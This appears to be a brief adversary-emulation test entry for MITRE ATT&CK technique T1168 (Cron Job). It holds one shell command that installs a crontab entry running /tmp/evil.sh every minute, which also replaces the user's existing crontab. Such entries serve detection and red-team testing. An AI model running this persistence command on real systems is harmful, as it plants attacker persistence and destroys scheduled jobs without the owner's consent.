# Cron Job

## MITRE ATT&CK Technique: [T1168](https://attack.mitre.org/wiki/Technique/T1168)

## Command
    echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
